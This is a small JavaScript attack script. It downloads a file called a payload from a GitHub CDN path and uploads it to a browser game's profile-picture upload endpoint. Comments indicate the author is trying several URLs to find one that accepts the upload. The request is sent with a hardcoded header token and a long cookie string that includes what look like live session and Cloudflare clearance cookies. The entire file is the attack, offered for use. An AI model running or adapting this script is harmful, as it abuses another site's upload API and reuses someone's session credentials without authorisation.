const TargetUrl = 'https://apibeta.deeeep.io/users/uploadpic';
// I'm gonna try multiple URL's but I think this one is the best

const PayloadUrl = 'https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/file.txt';
// Just a lil test





const headers = {
'Twitch':'FyznWUlI-snOTJR151fEHUSCdLkfnJIzAmfo',
'Cookie':'G_ENABLED_IDPS=google; _ga_BG7E0N670Q=GS1.1.1704476335.1.0.1704476335.0.0.0; _ga_6SX4GD0CKY=GS1.1.1704475883.3.1.1704476805.0.0.0; _gid=GA1.2.1113143865.1705891845; dinfo.schema=s%3ALRJA3HzmonHie1D5ynlXjy3K7mDicxUX.0V3fvGfNS4o2kQF1lj%2FC%2BbUsTvrJy%2FVa7X%2B5ZLzz6S4; FCCDCF=%5Bnull%2Cnull%2Cnull%2C%5B%22CP41g8AP41g8AEsACBPLAkEoAP_gAEPgAACIINJD7D7FbSFCwHpzaLsAMAhHRsCAQoQAAASBAmABQAKQIAQCgkAQFASgBAACAAAAICZBIQAECAAAAUAAQAAAAAEEAAAAAAAIIAAAgAEAAAAIAAACAAAAEAAIAAAAEAAAmAgAAIIACAAAhAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAQQaQD2F2K2kKFkPCmQWYAQBCijYEAhQAAAAkCBIAAgAUgQAgFIIAgAIFAAAAAAAAAQEgCQAAQABAAAIACgAAAAAAIAAAAAAAQQAAAAAIAAAAAAAAEAAAAAAAQAAAAIAABEhCAAQQAEAAAAAAAQAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAgAA%22%2C%222~2072.70.89.93.108.122.149.196.2253.2299.259.2357.311.313.317.323.2373.338.358.2415.415.449.2506.2526.482.486.494.495.2568.2571.2575.540.574.2624.609.2677.864.981.1029.1048.1051.1095.1097.1201.1205.1211.1276.1301.1344.1365.1415.1423.1449.1451.1570.1577.1598.1651.1716.1735.1753.1765.1870.1878.1889.1958.1960~dv.%22%2C%227F77A345-8F73-4705-99FE-C229BE9CFBCB%22%5D%5D; CHROMEV=f0a60f33f3d8e491ce1d68ae2b9919bc; _ga_6PFVSEYZ5L=GS1.1.1706029871.27.1.1706034810.0.0.0; cf_clearance=eIULTI3jQLAZbJq0q9QxlHVMNkFveap15hrhFCdfNq0-1706034811-1-AZDjAtPlpL7ZHlg8xfVac0rIGpk+cU4t98opByll3S/vDjtyzMsMQNBmEbeKdAWeSmiUC/a7VSJvr7yWceXys2U=; _ga=GA1.1.838634859.1667939870; __gads=ID=6aaebe7e4b1440fa:T=1704469916:RT=1706034811:S=ALNI_MbJSm7RZHE5suWUvV32Kt_Z6GHeAg; __gpi=UID=00000d39f1f83a2b:T=1704469916:RT=1706034811:S=ALNI_MYfVBq0iB0ybE94_T7ALWCtQHrl9w; _ga_5DKDKDCKJQ=GS1.1.1706029872.21.1.1706034811.0.0.0; FCNEC=%5B%5B%22AKsRol_IqN4mWSgOWrg-MOwpPm4-PtGZKM-w0Ok1vd6pSKmwlVpSOiPAzw0KpbTPyvpvib9Tg9r8WXYW9jx2E9nRbu1dhrlieLz1Vtd9-MSGbDP8qwEt_l0f1HFZz-NtdMctfvgEcRZRdTl2EkvbjkKwKBvPmOO_RA%3D%3D%22%5D%5D',
};

fetch(PayloadUrl)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.statusText}`);
    }
    return response.blob();
  })
  .then(blob => {
const formData = new FormData();
formData.append('file', blob, 'payload.txt');


return fetch(TargetUrl, {
  method: 'POST',
  body: formData,
headers: headers,
});
})
.then(response => response.json())
.then(data => {
  console.log('Server response:', data);
})
.catch(error => {
  console.error('Error:', error);
});
